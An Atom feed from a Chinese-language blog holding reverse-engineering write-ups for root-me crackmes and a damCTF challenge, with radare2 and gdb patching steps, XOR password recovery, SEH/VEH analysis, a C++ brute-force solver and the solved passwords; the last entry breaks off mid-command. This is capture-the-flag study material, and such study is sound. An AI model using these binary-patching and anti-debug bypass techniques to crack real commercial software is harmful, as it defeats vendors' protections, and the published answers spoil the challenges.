<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>FINSENTY54</title>
  
  <subtitle>几处早莺争暖树，谁家新燕啄春泥。</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://finsenty54.github.io/"/>
  <updated>2020-10-19T02:10:41.090Z</updated>
  <id>http://finsenty54.github.io/</id>
  
  <author>
    <name>finsenty54</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>逆向_root_me_4</title>
    <link href="http://finsenty54.github.io/2020/10/19/%E9%80%86%E5%90%91_root_me_4/"/>
    <id>http://finsenty54.github.io/2020/10/19/逆向_root_me_4/</id>
    <published>2020-10-19T02:09:51.000Z</published>
    <updated>2020-10-19T02:10:41.090Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ELF-—-Random-Crackme"><a href="#ELF-—-Random-Crackme" class="headerlink" title="ELF — Random Crackme"></a>ELF — Random Crackme</h2><p>将<code>magic</code>之前的内容都删除，因为之前的垃圾内容，使得不能运行ELF文件<br><code>ELF files start with 7f 45 4c 46</code><br><a href="https://imgchr.com/i/0v8xN8" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/10/19/0v8xN8.jpg" alt="0v8xN8.jpg" border="0"></a></p><a id="more"></a><hr><p><code>r2 -ww ./ch3.bin</code><br><code>-w</code>          open file in write mode<br><code>ww foobar</code>            write wide string ‘f\x00o\x00o\x00b\x00a\x00r\x00’<br> <code>wx 9090</code>     write two intel nops</p><pre><code>[0x080482f0]&gt; wx eb @ 0x0804841A</code></pre><p><code>Short Jump</code>（短跳转）机器码 <code>EB</code></p><hr><p><a href="https://imgchr.com/i/0vGPjs" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/10/19/0vGPjs.jpg" alt="0vGPjs.jpg" border="0"></a></p><p>用time,rand产生随机密码<br>gdb 直接设置<code>eip</code> 跳过代码</p><pre><code>set $eip=xxxx</code></pre><p>再运行<code>c</code></p><hr><pre><code>binwalk crackme_wtf</code></pre><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">r2</span><br><span class="line">aaa</span><br><span class="line">afl <span class="comment">//list function</span></span><br><span class="line">s sym.main</span><br></pre></td></tr></table></figure><h2 id="ELF-x64-Crackme-automating"><a href="#ELF-x64-Crackme-automating" class="headerlink" title="ELF x64 - Crackme automating"></a>ELF x64 - Crackme automating</h2><p>str=”break\n”<br>var4=0<br>var8=0xf7<br><code>(MOVSXD r64, r/m32</code> Move doubleword to quadword with sign-extension.<br>这是64位代码中的指令，它将32位寄存器或地址转换为32位值，并将其符号扩展为64位寄存器。 符号扩展采用源的最高位（符号位）的值，并使用它来填充目标的所有高位。)</p><p>var4+str<br>位置加var4<br>(<code>movzx</code>是将源操作数的内容拷贝到目的操作数，并将该值用0扩展至16位或者32位。但是它只适用于无符号整数。 他大致下面的三种格式。)</p><p>str[0]<br><code>MOVSX</code> 指令（进行符号扩展并传送）将源操作数内容复制到目的操作数，并把目的操作数符号扩展到 16 位或 32 位。这条指令只用于有符号整数，</p><p><code>xor (str[0] ,0xa3)=0xf7</code></p><p><code>str[1]</code></p><p><code>cmp eax, 0xf7</code></p><p>注：上篇有自动化代码链接</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;ELF-—-Random-Crackme&quot;&gt;&lt;a href=&quot;#ELF-—-Random-Crackme&quot; class=&quot;headerlink&quot; title=&quot;ELF — Random Crackme&quot;&gt;&lt;/a&gt;ELF — Random Crackme&lt;/h2&gt;&lt;p&gt;将&lt;code&gt;magic&lt;/code&gt;之前的内容都删除，因为之前的垃圾内容，使得不能运行ELF文件&lt;br&gt;&lt;code&gt;ELF files start with 7f 45 4c 46&lt;/code&gt;&lt;br&gt;&lt;a href=&quot;https://imgchr.com/i/0v8xN8&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;&lt;img src=&quot;https://s1.ax1x.com/2020/10/19/0v8xN8.jpg&quot; alt=&quot;0v8xN8.jpg&quot; border=&quot;0&quot;&gt;&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="RCE" scheme="http://finsenty54.github.io/tags/RCE/"/>
    
  </entry>
  
  <entry>
    <title>root_me_PE_x86_SEHVEH_WP</title>
    <link href="http://finsenty54.github.io/2020/10/13/root_me_PE_x86_SEHVEH_WP/"/>
    <id>http://finsenty54.github.io/2020/10/13/root_me_PE_x86_SEHVEH_WP/</id>
    <published>2020-10-13T11:02:38.000Z</published>
    <updated>2020-10-13T11:03:41.587Z</updated>
    
    <content type="html"><![CDATA[<h3 id="PE-DotNet-0-protection"><a href="#PE-DotNet-0-protection" class="headerlink" title="PE DotNet - 0 protection"></a>PE DotNet - 0 protection</h3><p>使用 <code>NET relector</code>工具<br>或者<code>dnSPY</code><br><a href="https://github.com/0xd4d/dnSpy/releases" target="_blank" rel="noopener">https://github.com/0xd4d/dnSpy/releases</a><br>就可以破解</p><a id="more"></a><hr><h3 id="ELF-x64-Crackme-automating"><a href="#ELF-x64-Crackme-automating" class="headerlink" title="ELF x64 - Crackme automating"></a>ELF x64 - Crackme automating</h3><p>python 编程</p><p><code>别人写的代码</code><br><a href="https://mydiary42.wordpress.com/2019/01/26/root-me-crackme-automating/" target="_blank" rel="noopener">https://mydiary42.wordpress.com/2019/01/26/root-me-crackme-automating/</a></p><p>int([x]) -&gt; integer<br>int(x, base=10) -&gt; integer<br>将数字或字符转为整形<br>Convert a number or string to an integer, or return 0 if no arguments are given. </p><pre><code>num=line[addr+1,-1]byte.append(int (num,16)) //将num变为16进制</code></pre><p>使用<code>pwntools</code> / <code>Capstone</code> /<code>objdump</code> 获得反汇编代码<br>之后进行搜索</p><hr><h3 id="PE-x86-SEHVEH-WP"><a href="#PE-x86-SEHVEH-WP" class="headerlink" title="PE x86 - SEHVEH_WP"></a>PE x86 - SEHVEH_WP</h3><p>从题目知道是关于SEH 和 VEH（VectoredExceptionHandler）的。</p><p><em>OllyDBG 查看seh链 选择 <code>view-seh chain</code></em></p><hr><ol><li><p>在输入后进入主要部分。<br><img src="https://s1.ax1x.com/2020/10/13/0hMvnK.jpg" alt="0hMvnK.jpg" border="0"><br>这段不是很懂，根据多次调试后判断，如果输入12个字节，则<code>0xB814A8</code>处就可以跳转，使<code>EBP</code>为0.<br><img src="https://s1.ax1x.com/2020/10/13/0hQv2n.jpg" alt="0hQv2n.jpg" border="0"><br>为0，即表示密码正确，会输入成功语句。</p></li><li><p>接下来是第一部分密码<br><img src="https://s1.ax1x.com/2020/10/13/0hllIe.jpg" alt="0hllIe.jpg" border="0"><br><code>LODS</code>即将密码头四个字节放入<code>EAX</code>中，将<code>0x5A643059 xor 0x 3628552E</code>得到第一部分密码，还需反序排列为<code>weLl</code></p></li><li><p>FS：[0] 为TEB结构体中指向第一个SEH结构体地址<br><img src="https://s1.ax1x.com/2020/10/13/0h1iOP.jpg" alt="0h1iOP.jpg" border="0"><br><img src="https://s1.ax1x.com/2020/10/13/0h1fXt.jpg" alt="0h1fXt.jpg" border="0"><br>即<code>0xEFFC14</code>.<br>接着，执行<code>INT 1</code>指令后，会进入<code>0xDB1D60</code>处的第一个SEH函数。<br><img src="https://s1.ax1x.com/2020/10/13/0hdwPP.jpg" alt="0hdwPP.jpg" border="0"><br>SEH函数的第三个参数，即<code>[ESP+C]</code>为pContext的地址，pContext保存线程切换时的寄存器信息。在PE 32位下，<code>+0xB0</code>为EAX寄存器的值，<code>0xB81D64</code>处将<code>0x48335621</code>加到<code>EAX+0xB0</code>中，保存着输入的第二部分四字节密码。<br><code>+0xB8</code>为EIP寄存器的值，通过下面的判断将EIP值加2，结果为<code>0xB814E4</code>，即<code>INT 1</code>指令的下一条指令地址。<br><code>XOR EAX,EAX</code>将EAX置0，表示从发生异常的代码处继续执行。<br><img src="https://s1.ax1x.com/2020/10/13/0hwUL4.jpg" alt="0hwUL4.jpg" border="0"><br>最后计算如下：<br><code>FF2C F8E5 XOR 495F 4265 = B673 BA80 - 48335621 = 6E40 645F=n@d_</code><br>反序排列为<code>_d@n</code></p></li><li><p><code>0xB814FF</code>处调用<code>AddVectoredExceptionHandler</code>函数，新增一个SEH函数。<br><img src="https://s1.ax1x.com/2020/10/13/0h09pV.jpg" alt="0h09pV.jpg" border="0"><br>以下摘自<a href="https://docs.microsoft.com/en-us/windows/win32/api/errhandlingapi/nf-errhandlingapi-addvectoredexceptionhandler" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/windows/win32/api/errhandlingapi/nf-errhandlingapi-addvectoredexceptionhandler</a></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">PVOID <span class="title">AddVectoredExceptionHandler</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  ULONG                       First,</span></span></span><br><span class="line"><span class="function"><span class="params">  PVECTORED_EXCEPTION_HANDLER Handler</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure></li></ol><p><code>First</code><br>The order in which the handler should be called. If the parameter is nonzero, the handler is the first handler to be called. If the parameter is zero, the handler is the last handler to be called.<br>如果不为0，则成为第一个调用的SEH函数，从图中可以看到，<code>First=1</code>.<br><code>Handler</code><br>A pointer to the handler to be called. For more information, see VectoredHandler.<br>从图中看出，函数地址为<code>0xB81940</code>，<br><code>Return value</code><br>If the function succeeds, the return value is a handle to the exception handler.<br>If the function fails, the return value is NULL.<br><img src="https://s1.ax1x.com/2020/10/13/0h0zHH.jpg" alt="0h0zHH.jpg" border="0"><br>该函数将第三部分的四字节密码减去了一个数，之后，又执行第二个SEH函数。<code>有个疑问是这里将返回值置0，又怎么执行第二个SEH函数。</code><br>最后计算如下：<br><code>3C4C7440 xor 74406653 =480C 1213 + 21486553 - 48335621=21212145=!!!E</code><br>反序排列为<code>E!!!</code></p><ol><li>最后三部分密码组合在一起：<code>weLl_d@nE!!!</code><br><img src="https://s1.ax1x.com/2020/10/13/0hDnsO.jpg" alt="0hDnsO.jpg" border="0"><br>密码正确</li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;PE-DotNet-0-protection&quot;&gt;&lt;a href=&quot;#PE-DotNet-0-protection&quot; class=&quot;headerlink&quot; title=&quot;PE DotNet - 0 protection&quot;&gt;&lt;/a&gt;PE DotNet - 0 protection&lt;/h3&gt;&lt;p&gt;使用 &lt;code&gt;NET relector&lt;/code&gt;工具&lt;br&gt;或者&lt;code&gt;dnSPY&lt;/code&gt;&lt;br&gt;&lt;a href=&quot;https://github.com/0xd4d/dnSpy/releases&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://github.com/0xd4d/dnSpy/releases&lt;/a&gt;&lt;br&gt;就可以破解&lt;/p&gt;
    
    </summary>
    
    
      <category term="RCE" scheme="http://finsenty54.github.io/tags/RCE/"/>
    
  </entry>
  
  <entry>
    <title>damCTF- rev/schlage (beginner) __WP</title>
    <link href="http://finsenty54.github.io/2020/10/12/schlage%20(beginner)%20__WP/"/>
    <id>http://finsenty54.github.io/2020/10/12/schlage (beginner) __WP/</id>
    <published>2020-10-12T08:02:16.000Z</published>
    <updated>2020-10-12T08:08:47.094Z</updated>
    
    <content type="html"><![CDATA[<h2 id="damCTF-rev-schlage-beginner-WP"><a href="#damCTF-rev-schlage-beginner-WP" class="headerlink" title="damCTF- rev/schlage (beginner) __WP"></a>damCTF- rev/schlage (beginner) __WP</h2><ol><li><p>先用<code>file</code>命令查看<br><img src="https://s1.ax1x.com/2020/10/12/0Rkyfe.jpg" alt="0Rkyfe.jpg" border="0"><br>可以看到是64位的ELF文件,debug信息还在</p></li><li><p>接着使用radare2反汇编<br><img src="https://s1.ax1x.com/2020/10/12/0RE8xJ.jpg" alt="0RE8xJ.jpg" border="0"></p></li></ol><p>使用<code>VV</code>命令进入视图模式</p><a id="more"></a><hr><p>我们的任务是解锁，这里又5把锁<br><img src="https://s1.ax1x.com/2020/10/12/0RVJfS.jpg" alt="0RVJfS.jpg" border="0"></p><hr><p>关键的代码是这5个函数<br><img src="https://s1.ax1x.com/2020/10/12/0RVIk6.jpg" alt="0RVIk6.jpg" border="0"></p><hr><h3 id="Pin1"><a href="#Pin1" class="headerlink" title="Pin1"></a>Pin1</h3><p>第三把锁比较简单，来看第一把锁<br><img src="https://s1.ax1x.com/2020/10/12/0RZxKJ.jpg" alt="0RZxKJ.jpg" border="0"></p><p>也可以在视图模式按<code>o</code>再输入函数旁边的字母<br><img src="https://s1.ax1x.com/2020/10/12/0Rnph6.jpg" alt="0Rnph6.jpg" border="0"></p><p>这是一个循环操作，共五次，每一次将两个数字异或，最后和<code>0xee</code>比较，相同则成功<br><code>rbp+rax-0x0e</code>即指向开头移入地址的5个数</p><p><code>0x3e xor 0x57 xor 0x81 xor 0xd3 xor 0x 25 xor 0x 93 xor 0xee</code> 结果为0<code>x99</code></p><h4 id="jle："><a href="#jle：" class="headerlink" title="jle："></a>jle：</h4><p>JNB al, bl  ；al里的内容不等于bl时跳转<br>JBE al, bl ；al里的内容小于或等于bl时跳转</p><p>；同理，JGB是大于或等于，<code>JLE是小于或等于</code><br>；A（above）大于，B（below）小于，E（equal）等于，用于比较无符号数<br>；G（great）大于，L（less than）小于， E（equal）等于，用于比较带符号数</p><hr><h3 id="pin5"><a href="#pin5" class="headerlink" title="pin5"></a>pin5</h3><p><img src="https://s1.ax1x.com/2020/10/12/0RuadA.jpg" alt="0RuadA.jpg" border="0"></p><h4 id="srand"><a href="#srand" class="headerlink" title="srand()"></a>srand()</h4><p>第5把锁用到了<code>srand()</code>和<code>rand()</code>两个函数。</p><p>根据种子产生随机数<br>1) 给srand()提供一个种子，它是一个unsigned int类型；<br>2) 调用rand()，它会根据提供给srand()的种子值返回一个随机数(在0到RAND_MAX之间)；</p><p>也就是，一个种子，它所产生的随机数是固定的。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> a=<span class="number">1111638594</span>； <span class="comment">//0x42424242</span></span><br><span class="line">srand(a); </span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;rand()&lt;&lt;<span class="built_in">endl</span>;</span><br></pre></td></tr></table></figure></p><p>输入<code>rand()</code>生成的随机数即可，即为<code>1413036362</code></p><h4 id="lea"><a href="#lea" class="headerlink" title="lea"></a>lea</h4><p>lea是“load effective address”的缩写，简单的说，lea指令可以用来将一个内存地址<code>直接</code>赋给目的操作数，例如：lea eax,[ebx+8]就是将ebx+8这个值直接赋给eax，而不是把ebx+8处的<code>内存地址里</code>的<code>数据</code>赋给eax。而mov指令则恰恰相反，例如：mov eax,[ebx+8]则是把内存地址为ebx+8处的数据赋给eax。</p><hr><h3 id="pin2"><a href="#pin2" class="headerlink" title="pin2"></a>pin2</h3><p><img src="https://s1.ax1x.com/2020/10/12/0RKg1K.jpg" alt="0RKg1K.jpg" border="0"><br>查看汇编代码可以知道，pin2根据实际输出了一个种子，根据种子调用<code>rand()</code>即可。</p><p>这个种子下一把锁还要用到，再一次调用<code>rand()</code>，获得的是第二个随机数。</p><hr><h3 id="pin4"><a href="#pin4" class="headerlink" title="pin4"></a>pin4</h3><p>我认为这是最难得了，主要是编程。<br>直接看r2 太复杂，所以我用IDA PRO，然后F5反编译。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">"What's your favorite sentence?"</span>);</span><br><span class="line">   fgets(s, <span class="number">32</span>, <span class="built_in">stdin</span>);</span><br><span class="line">   s[<span class="built_in">strcspn</span>(s, <span class="string">"\n"</span>)] = <span class="number">0</span>;         <span class="comment">//换行符变为0x00</span></span><br><span class="line">   v3 = rand() % <span class="number">10</span> + <span class="number">65</span>;</span><br><span class="line">   v1 = <span class="number">0</span>;</span><br><span class="line">   v4 = <span class="built_in">strlen</span>(s);                             <span class="comment">// strlen 遇到/0结束</span></span><br><span class="line">   <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v4; ++i )</span><br><span class="line">     v1 += v3 ^ s[i];        <span class="comment">//将随机值与字符异或，结果相加要为291</span></span><br><span class="line">   <span class="keyword">if</span> ( v1 == <span class="number">291</span> )</span><br><span class="line">   &#123;</span><br><span class="line">     <span class="built_in">puts</span>(<span class="string">"Such a cool sentence!"</span>);</span><br><span class="line">     byte_20203C = <span class="number">1</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">   &#123;</span><br><span class="line">     <span class="built_in">puts</span>(<span class="string">"Not a big fan of that sentence"</span>);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></p><p>注释已经写在代码中，接下来，就是编程破解得到符合的字符串。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">        <span class="comment">/*FILE *pe=NULL;</span></span><br><span class="line"><span class="comment">        char s[1]=&#123;'1'&#125;;</span></span><br><span class="line"><span class="comment">        pe=popen("nc chals.damctf.xyz 31932","rw");</span></span><br><span class="line"><span class="comment">        if(pe==NULL)</span></span><br><span class="line"><span class="comment">                cout&lt;&lt;"connect failed"&lt;&lt;endl;</span></span><br><span class="line"><span class="comment">        while (1)</span></span><br><span class="line"><span class="comment">        &#123;</span></span><br><span class="line"><span class="comment">                fwrite(s,sizeof(s),1,pe);</span></span><br><span class="line"><span class="comment">                fgets(s,20,pe);</span></span><br><span class="line"><span class="comment">                cout&lt;&lt;s;</span></span><br><span class="line"><span class="comment">                break;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        pclose(pe);*/</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> a=<span class="number">1602480388</span>;<span class="comment">//1111638594</span></span><br><span class="line">        srand(a); </span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;rand()&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> v3 = rand() % <span class="number">10</span> + <span class="number">65</span>;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"v3="</span>&lt;&lt;v3&lt;&lt;<span class="built_in">endl</span>; <span class="comment">//=74</span></span><br><span class="line">        <span class="keyword">int</span> remain=<span class="number">291</span>; <span class="comment">//291下搜索</span></span><br><span class="line">        <span class="keyword">int</span> qu=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> resu;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">32</span>;i++)&#123;  <span class="comment">//最大允许输入31个字符</span></span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;<span class="number">58</span>;j++)&#123; <span class="comment">//从A开始搜索</span></span><br><span class="line">                        resu=v3^<span class="keyword">int</span>(<span class="string">'A'</span>+j);</span><br><span class="line">                        <span class="keyword">if</span>(resu==<span class="number">0</span>) <span class="comment">//==0没有用</span></span><br><span class="line">                                &#123;<span class="keyword">continue</span>;&#125;</span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span> ( resu&lt;remain || remain%resu==<span class="number">0</span>)&#123; <span class="comment">//实际上感觉不用加后面的条件</span></span><br><span class="line">                                qu+=remain/resu; <span class="comment">//累计得到的字符数</span></span><br><span class="line">                                <span class="keyword">if</span>(qu&gt;<span class="number">31</span>)&#123; <span class="comment">//不能大于31</span></span><br><span class="line">                                        qu-=remain/resu;</span><br><span class="line">                                        <span class="keyword">continue</span>;</span><br><span class="line">                                &#125;</span><br><span class="line">                                <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">0</span>;k&lt;remain/resu;k++) <span class="comment">//输出成功的字符</span></span><br><span class="line">                                        <span class="built_in">cout</span>&lt;&lt;<span class="keyword">char</span>(<span class="string">'A'</span>+j);</span><br><span class="line">                                <span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">                                remain=remain%resu; <span class="comment">//更新余下值</span></span><br><span class="line">                                <span class="built_in">cout</span>&lt;&lt;<span class="string">"i=  "</span>&lt;&lt;i&lt;&lt;<span class="string">"   "</span>&lt;&lt;<span class="string">"resu="</span>&lt;&lt;resu&lt;&lt;<span class="string">"qu= "</span>&lt;&lt;qu&lt;&lt;<span class="string">"remain="</span>&lt;&lt;remain&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">                                i=qu<span class="number">-1</span>; <span class="comment">//更新i</span></span><br><span class="line">                                <span class="built_in">cout</span>&lt;&lt;<span class="string">"after i= "</span>&lt;&lt;i&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (remain==<span class="number">0</span>) <span class="comment">//填满291 成功</span></span><br><span class="line">                &#123;</span><br><span class="line">                        <span class="built_in">cout</span>&lt;&lt;<span class="string">"find"</span>&lt;&lt;<span class="string">"i="</span>&lt;&lt;i&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span>(i&gt;=<span class="number">31</span>) <span class="comment">//最后都没有搜索到，失败</span></span><br><span class="line">                &#123;</span><br><span class="line">                        <span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>&lt;&lt;<span class="string">"don't find"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">                        <span class="built_in">cout</span>&lt;&lt;<span class="string">"remainder= "</span>&lt;&lt;remain&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输入字符，成功解锁。</p><p><img src="https://s1.ax1x.com/2020/10/12/0Rlsts.jpg" alt="0Rlsts.jpg" border="0"></p><p>最后flag文件在远程服务器，但链接时间很短，可能需要脚本自动化发送，有点小难😢</p><hr><h4 id="fgets"><a href="#fgets" class="headerlink" title="fgets()"></a>fgets()</h4><p>C 库函数 char <em>fgets(char </em>str, int n, FILE *stream) 从指定的流 stream 读取一行，并把它存储在 str 所指向的字符串内。当读取 (n-1) 个字符时，或者读取到换行符时，或者到达文件末尾时，它会停止，具体视情况而定。</p><h4 id="strlen"><a href="#strlen" class="headerlink" title="strlen()"></a>strlen()</h4><p>C 库函数 size_t strlen(const char *str) 计算字符串 str 的长度，直到空结束字符，但不包括空结束字符。</p><h3 id="结束语"><a href="#结束语" class="headerlink" title="结束语"></a>结束语</h3><p>不愧是新手题，只是最后编程花了我不少时间。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;damCTF-rev-schlage-beginner-WP&quot;&gt;&lt;a href=&quot;#damCTF-rev-schlage-beginner-WP&quot; class=&quot;headerlink&quot; title=&quot;damCTF- rev/schlage (beginner) __WP&quot;&gt;&lt;/a&gt;damCTF- rev/schlage (beginner) __WP&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;p&gt;先用&lt;code&gt;file&lt;/code&gt;命令查看&lt;br&gt;&lt;img src=&quot;https://s1.ax1x.com/2020/10/12/0Rkyfe.jpg&quot; alt=&quot;0Rkyfe.jpg&quot; border=&quot;0&quot;&gt;&lt;br&gt;可以看到是64位的ELF文件,debug信息还在&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;接着使用radare2反汇编&lt;br&gt;&lt;img src=&quot;https://s1.ax1x.com/2020/10/12/0RE8xJ.jpg&quot; alt=&quot;0RE8xJ.jpg&quot; border=&quot;0&quot;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;使用&lt;code&gt;VV&lt;/code&gt;命令进入视图模式&lt;/p&gt;
    
    </summary>
    
    
      <category term="RCE" scheme="http://finsenty54.github.io/tags/RCE/"/>
    
  </entry>
  
  <entry>
    <title>逆向_root_me_3</title>
    <link href="http://finsenty54.github.io/2020/10/08/%E9%80%86%E5%90%91_root_me_3/"/>
    <id>http://finsenty54.github.io/2020/10/08/逆向_root_me_3/</id>
    <published>2020-10-08T12:21:43.000Z</published>
    <updated>2020-10-08T12:22:25.176Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ELF-x86-No-software-breakpoints"><a href="#ELF-x86-No-software-breakpoints" class="headerlink" title="ELF x86 - No software breakpoints"></a>ELF x86 - No software breakpoints</h2><h3 id="看反汇编，大致了解过程"><a href="#看反汇编，大致了解过程" class="headerlink" title="看反汇编，大致了解过程"></a>看反汇编，大致了解过程</h3><p>这是众所周知的<code>反调试</code>技术，它不能在应用程序本身中<code>放置任何软件断点</code>。因为当我们在<code>用户模式</code>应用程序中遇到<code>断点</code>时，代码中将放入<code>0xCC（int3）</code>，因此计算将是错误的，并将生成错误的<code>校验和</code>.<br><a id="more"></a><br>这是在ecx中计算一种散列值，它基于入口点的整个代码。如果我们对函数进行任何更改，值将不再相同，从而阻止我们编辑二进制文件.</p><p>计算整个<code>text 指令的和</code>，所以放入<code>0xCC</code>会 报错，也就是改变的指令。</p><hr><h3 id="移位运算符"><a href="#移位运算符" class="headerlink" title="移位运算符"></a>移位运算符</h3><p>a&lt;&lt;3<br><code>a的内容不改变</code></p><p><code>edx &amp; 0xff</code><br>取最后8位</p><hr><h3 id="g"><a href="#g" class="headerlink" title="g++"></a>g++</h3><pre><code>g++主要用来编译c++文件，g++编译c++文件是会连接libc++。gcc主要用来编译c文件，也可编译c++，但gcc编译c++文件默认不连接libc++。</code></pre><hr><h3 id="移位"><a href="#移位" class="headerlink" title="移位"></a>移位</h3><p>移位时，移出的位数全部丢弃，移出的空位补入的数与左移还是右移有关。如果是<code>左移</code>，则规定补入的数全部是<code>0</code>；如果是<code>右移</code>，还与被移位的数据是否带<code>符号</code>有关。若是<code>不带符号数</code>，则补入的数全部为<code>0</code>；若是<code>带符号数</code>，则补入的数全部等于原数的最左端位上的原数(即<code>原符号位</code>)</p><hr><h3 id="命名空间"><a href="#命名空间" class="headerlink" title="命名空间"></a>命名空间</h3><p>引入了命名空间这个概念，它可作为<code>附加信息来区分</code>不同库中相同名称的函数、类、变量等。使用了命名空间即定义了上下文。本质上，命名空间就是定义了<code>一个范围</code>。</p><p>可以使用 <code>using namespace</code> 指令，这样在使用命名空间时就可以<code>不用在前面加上</code>命名空间的名称。这个指令会告诉编译器，后续的代码将使用指定的命名空间中的名称。</p><hr><h2 id="ELF-x86-CrackPass"><a href="#ELF-x86-CrackPass" class="headerlink" title="ELF x86 - CrackPass"></a>ELF x86 - CrackPass</h2><p><code>gdb-peda$ help x</code><br>Examine memory: x/FMT ADDRESS.</p><hr><p><code>gdb-peda$ print/t 